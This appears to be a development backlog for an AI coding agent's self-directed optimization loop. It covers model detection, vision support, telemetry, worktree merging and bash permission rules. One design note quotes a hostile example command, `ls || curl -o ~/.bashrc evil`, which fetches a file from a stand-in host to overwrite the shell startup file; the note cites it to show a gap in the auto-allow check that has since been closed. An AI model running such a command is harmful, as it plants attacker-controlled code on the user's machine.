# DELFIN Agent — Optimization Backlog

Durable work-queue for the self-paced optimization loop. The loop draws tasks
in this priority order and appends new findings back here.

## Loop protocol (each iteration)
1. **Sync & baseline** — `git pull`/fetch; run the full suite. Establish that
   the only expected failure is the pre-existing `test_runtime_setup.py::…xtb4stda`
   (missing binary bundle). Anything else red → fix that first.
2. **Pick ONE task** by priority: open bug reports → a regression caught by the
   smoke → the highest-value backlog item below → a weak spot from
   telemetry/traces.
3. **Implement** small + atomic; **test** — full suite AND a **live check with a
   real model** (qwen via Ollama localhost or KIT `kit.qwen3.5-397b-A17b`):
   don't just build, prove the change actually works end-to-end. **Never commit
   on red.**
4. **Ship** — commit to `main` (no Co-Authored-By trailer), push; move a fixed
   bug report to `…/AGENT_BUGS/Solved`; tick the item here + note any new
   finding.
5. **Repeat.** Keep each iteration independently green and reversible; route
   anything risky/large to review instead of `main`.

## Backlog (curated; newest insight wins)

### Model adaptivity
- [x] **Weak-model detection misses small multi-modal/reasoning tags** —
  `prompt_loader._is_weak_model` now parses a generic `<N>b` parameter-size tag
  (`_param_size_b`): an explicit size is authoritative (≤14b ⇒ weak), so any
  `:Nb` Ollama tag is classified right without enumerating every size in the
  family regex; MoE `…-A17b` active-param suffixes (glued to a letter) are
  ignored so only the total counts. Family regex stays as the no-size fallback.
  Live-proven: `qwen3-vl:4b` → core_tools_only, advertised **16** tools (was
  **47**); `gpt-oss:120b` keeps the full 47; real qwen3-vl:4b turn replied OK.
- [x] **KIT live context-window detection** — threaded the provider key
  (`resolve(..., api_key=)`) as a Bearer token into the `/v1/models` probe, and
  discovered KIT is an **Open-WebUI proxy**: no numeric `max_model_len`, the
  window lives as prose in `info.meta.description` ("Context length ≈ 256K").
  Added a prose parser + nested `info.meta` lookup, and bumped `_TIMEOUT_MODELS`
  3→8s (real KIT answers in ~5s; result is disk-cached 24h so it's one-time).
  Live-proven: qwen3.5-397b now resolves **262144** (was static 128000),
  gpt-oss-120b **131072**, gemma4-31b **262144**. Authed/key-less probes use
  distinct cache keys so a key-less miss is never served to an authed lookup.
  Follow-up: the ~5s first-turn probe is synchronous — could pre-warm/async.
- [x] **Live `available_models` into `route_model`** — the dashboard's single
  `route_model` call now feeds the model dropdown's values (which hold the live
  `/v1/models`·`/api/tags` list, else the curated fallback) as
  `available_models`, so routing never switches INTO a model the provider no
  longer serves. Live-proven against the real 23-model KIT list: complex turn →
  routes to `azure.gpt-5.4` (strong); with that tier removed from the list →
  falls back to the user model ("not in live model list"), no dead route.

### Multimodal / providers
- [x] **Agent can view images from disk** (Jerome report 20260617-140214,
  "Agent kann keine PNGs anzeigen/lesen") — new `view_image` tool: loads a
  PNG/JPEG/WebP/GIF, and the stream loop injects it as `image_url` visual
  content for the next round so the vision model actually SEES it (a tool result
  is text-only). Advertised only to vision-capable models; `read_file` now
  redirects images to it instead of returning garbage. Also fixed live vision
  detection: `model_capabilities` reads KIT's per-model `info.meta.capabilities.
  vision` flag (qwen3.5-397b / gemma4 were wrongly "no-vision"). Live-verified:
  KIT-qwen called `view_image` on a real PNG and described it (red circle +
  "DELFIN" text) correctly.
- [ ] **Claude-format vision** — `engine._build_user_message` only emits
  OpenAI `image_url` content (Ollama/KIT/OpenAI). Claude uses Anthropic image
  blocks → currently text-fallback. Add the Anthropic shape for the
  CLI/API backends.
- [x] **Non-chat models leak into the model picker** — `model_capabilities.
  nonchat_reason(id)` detects embedding / reranker / speech (whisper, tts,
  voxtral) / image (flux) models by name; `_fetch_models` skips them so the user
  can't pick a model that 400s ("does not support chat") at send time. Replaced
  the incomplete `_MODEL_ID_HIDE_SUBSTRINGS` (only matched "embedding"), which
  let reranker/whisper/voxtral/flux through. Live-verified against the real
  23-entry KIT list: 5 modality models hidden, 16 chat models kept. NOTE: the
  original premise was wrong — `standard-extern`/`standard-local` do NOT 400 any
  more (both answer on chat); they stay in `_KIT_SKIP` as quirky Open-WebUI
  presets (standard-extern returns empty on a trivial prompt), unchanged.

### Observability / self-improvement
- [x] **Per-turn timing telemetry** — `turn_metrics` records one entry per turn
  (provider/model/role, total_ms, **ttft_ms**, output_chars, tool_calls) to
  `~/.delfin/turn_metrics/<session>.jsonl`, bundled into bug reports. `is_stall`
  flags a turn where the wait — not the agent — ate the time (high ttft, tiny
  output, no tools): exactly the 20260616-101958 "Hallo → 92.7s" shape, so if it
  recurs the report proves backend stall vs code path. Live-verified: a real KIT
  engine turn recorded total=9.8s/ttft=9.8s/out=41ch/tools=0.
- [x] **Live tool-trace dashboard panel** — a compact, always-visible feed of
  the MAIN agent's tool calls (✓/✗ · tool · short input · duration), newest
  first, refreshed per tool_result and at turn end — the dashboard analogue of
  the terminal action feed, sibling to the existing subagent/task panels.
  `tool_trace.format_panel_html` + `_refresh_tool_trace_panel`. Tested
  (render + wiring). Follow-up still open: feed `tool_trace` into
  `agent_metrics`/`outcome_tracker` for aggregate stats (usage/error rates).
- [ ] **MCP resources/prompts UX** — beyond the agent meta-tools, surface MCP
  prompts as slash commands + resources as @-mentions in the dashboard.

### Worktree orchestration (focus area)
- [x] Auto-isolate parallel writers into separate worktrees (done earlier).
- [x] **Review**: subagent result now carries a `diff_summary` (changed files +
  --stat + untracked) so the parent SEES what an isolated writer did, not just
  `had_changes`. `worktree.diff_summary`. Live-verified with KIT-qwen.
- [x] **Integrate**: `worktree_merge` tool brings a worktree's changes back
  into the main tree, **clean-apply-or-nothing** (stage full state → patch vs
  branch-point → `git apply --check` → apply only if clean; on conflict the
  target is left untouched, worktree kept). Lands uncommitted for review.
  `worktree.merge_worktree`. Live-verified: KIT-qwen chained
  `enter_worktree → write_file → worktree_merge`, file arrived in the main tree.
  Fan-out-writers → review → merge flow is now complete.

### Done (recent, for context)
- [x] **Context-scaled tool-output elision budget** (trace-mined from fork-178,
  ka_xn0397: a 262-tool-call refactor read ONE 77k file **149×** — 164/167 reads
  were small paged windows, 0 exact dupes). Root cause: the fixed 60k-char
  (~15k-token) elision budget threw away earlier reads at ~6% of a 262k-context
  model's window, so the agent kept re-paging (~$50/turn). Fix:
  `_tool_context_char_budget(caps)` lets tool output use ~45% of the real window
  (~4 chars/token), floored at 60k so small models are unchanged; the loop
  computes it once and passes it to `_elide_old_tool_results`. Live (KIT qwen
  262k): loop budget 471859 (was 60000); reading a 24k file 3× elides nothing.
- [~] **TRIED & REVERTED — mid-loop "create a plan" nudge.** Built a one-shot
  nudge that injects a `task_create` reminder into the tool loop after 3 distinct
  files are edited in a turn with no task plan (well-gated: one-shot, skipped if
  any task exists, never on 1–2-file turns; pure `_plan_nudge_due` helper +
  unit tests). The gate fired **exactly once, correctly**, in two live KIT-qwen
  runs — but the model **ignored** the reminder both times (0 tasks created),
  including on a substantial 7-file refactor. So it was pure context noise with
  no behaviour change → reverted (not shipped). **Lesson:** kit.qwen3.5-397b does
  NOT respond to soft mid-loop planning nudges; it completes multi-file work
  fine without a plan. If revisited, try a system-prompt-level discipline (and
  prove the behaviour change live) rather than a reactive in-loop message — but
  first confirm the under-use actually causes failures, not just stylistic
  divergence from how Claude Code plans.
- [x] **PNG viewing for KIT qwen + stale-cache flush** (bugs 20260617-140214
  "Agent kann keine PNGs anzeigen/lesen" + 20260618-172931 "Files nur nach
  Chat-Upload sichtbar"). Root cause: kit.qwen3.5-397b-A17b IS vision-capable
  (KIT `info.meta.capabilities.vision: true`; live-verified — it reads
  "HELLO-7731" out of a PNG), but (a) the static table marked it text-only and
  (b) the live resolver caches results 24h, and entries written before this
  session's vision-parsing cached `supports_vision=False` as source=live → the
  vision gate kept stripping view_image. Chat-upload bypasses the gate, hence
  "only after upload". Fix: cache schema version (`_CACHE_VERSION=2`,
  `{"_v","entries"}` envelope) — a missing/mismatched version discards the whole
  file so everyone re-resolves live at once. Live-proven: stale flat
  vision=False entry flushed → re-resolves vision=True → agent reads a workspace
  PNG via the tool path (not chat upload). Reports ready for Solved.
- [x] **Triage: bug 20260617-110702** ("Tasks-Nummerierung fängt bei 51 an im
  neuen Chat → sollte bei 1") — resolved by the session-relative `seq` fix
  below: a new chat = new session_id → seq starts at 1. Ready for Solved.
- [x] **Session-relative task numbering** (bug 20260619-172400, ka_xn0397, the
  "tasks werden absolut weitergezählt / bin bei task 90" half). The global task
  `id` is a per-workspace monotonic counter that never resets. Added opt-in
  `TaskStore.list(with_seq=True)` → a 1-based, id-ordered, completion-stable
  session-local `seq`. Ticker (`#seq`), per-turn open-tasks reminder
  (`task N (id M)`) and task_create hint (`task N added (id M)`) now lead with
  seq; the global id stays the key for task_update/task_get/blocked_by and the
  tool doc tells the agent to narrate seq but pass id. Live (KIT qwen): new
  session shows `task 1` for global id 6, agent narrates "task number 1" yet
  completes id 6 correctly, old id-1 untouched. Report 172400 now fully fixed
  (both halves) — awaiting user `mv` to Solved (auto-mode blocked the shared mv).
- [x] **Per-turn tool-round cap is now a setting** (bug 20260619-172400,
  ka_xn0397, "nach 50 turns stoppt der agent automatisch" — the auto-stop half).
  `api_client._MAX_TOOL_ROUNDS` was a hard-coded 50; long multi-file work hit it
  mid-task and forced manual "continue". New `_resolve_max_tool_rounds()` reads
  `agent.max_tool_rounds` (default **500**, 0 → uncapped); exposed in the
  Settings tab (Agent extras → "🔁 Agent run limit"). The per-turn cost
  circuit-breaker + consecutive-fail abort stay the real stops. Live-proven on
  KIT qwen3.5-397b: cap forced to 1 → a 2-round task stops at round 1 with
  `stop_reason='max_tool_rounds'` + the budget notice. Report 172400 also has a
  SECOND half (task ids counted absolutely → "task 90"); still open — next.
  Gotcha logged: standalone `/tmp` live scripts import the stale editable
  checkout (`ComPlat/DELFIN`, was 291 behind), not the working tree — use
  `python -m`/`PYTHONPATH=repo`.
- [x] **Auto-allow: per-segment + versioned interpreters** (bug 20260616-183359,
  friction half) — `matches_bash_auto_allow` now splits on unquoted `||`/`&&`/
  `;`/`|`/newline and requires EVERY segment to be safe, instead of trusting a
  compound by its first segment (`ls || curl -o ~/.bashrc evil` was auto-allowed
  with only the deny-list as backstop — now refused). Same change removes the
  reported friction: an all-safe compound (`python3.10 --version || which
  python3.10 || echo nf`) auto-runs. Also widened `python3?` → versioned
  interpreters (`python3.10`/`3.11`). Live: KIT-qwen ran the exact reported
  command in default mode (exit 0, not blocked). Quoted `|` and `2>&1` intact.
  Broader UX (user chose "click-approve dialog", 2026-06-16): in "Ask All"
  (default) mode a non-auto-allowed bash command now routes through the existing
  KitConfirmBroker approval dialog (one click: approve→run, deny→blocked)
  instead of the prose block — head-less callers keep the prose fallback. The
  deny-list + secret scan still run first, so the dialog only appears for
  non-dangerous commands. Live-verified with KIT-qwen (approve runs, deny
  blocks). Shipped via branch/PR `fix/bash-approval-dialog-ask-all` (security-
  sensitive → review before merge), not direct-to-main.
- [x] **First-turn latency: capability probe moved off the hot path** — found
  while investigating bug 20260616-101958 (Dashboard/KIT/azure.gpt-5.4 "Hallo"
  → 92.7s). The per-turn `stream_message` did a synchronous live `/v1/models`
  probe on a cold cache (~5s, worsened to ~8s by the iteration-6 timeout bump),
  delaying the first token. Fix: `engine._refresh_context_window` now passes the
  provider key and runs at construction/switch_model (off the per-turn path),
  warming the *authed* cap cache so the first turn reads it instantly. Live:
  first KIT turn 17.8s → 4.7s. NOTE: the 92.7s itself was NOT reproducible —
  at the API azure.gpt-5.4 answers "Hallo" in 3–4s at every reasoning_effort
  (minimal 400s on Azure; low/med/high all ~3–4s, 0 reasoning tokens), with or
  without 47 tools, streaming or not. Most likely transient KIT GPU-queue
  latency, not a code path. Bug left open (can't repro / no archive write perm).
  Follow-up idea: per-turn timing telemetry to catch transient backend stalls.
- [x] **Busy-poll guard for `bash_status`** (bug 20260615-152119) — the
  `wait_seconds` blocking wait existed but only helped if the model used it;
  models still tight-polled a ~10-min job every 3-4s and exhausted the
  tool-round budget. Now the FIRST status check is an instant snapshot, but a
  re-check of the SAME still-running job *without* `wait_seconds` is throttled
  server-side (early-returns the instant the job ends). Model-independent.
  Live-verified two ways: real subprocess (instant snapshot → throttled
  re-poll returns at job end), and KIT-qwen drove `bash_background → 1×
  bash_status(wait_seconds) → bash_output` in 3 calls (was ~170).
- [x] `/loop` command — recurring agent loop (interval-based, scheduler-backed),
  like Claude Code's /loop. `/loop <5m|2h|1d> <prompt>` · `/loop list` ·
  `/loop stop <id|all>`. Live-verified: scheduler fires a real KIT-qwen turn.
  Also fixed: `/trace` was never routed (missing from `_SLASH_PREFIXES`).
- [x] read_file/grep/list no longer require the doc index (off-repo subagents).
- [x] reasoning-model token floor; reasoning channel surfaced.
- [x] vision wired (OpenAI-compatible backends).
- [x] memory consolidated on the typed store under `~/.delfin`.
- [x] honesty addendum; parallel-writer auto-isolation; tool tracing.
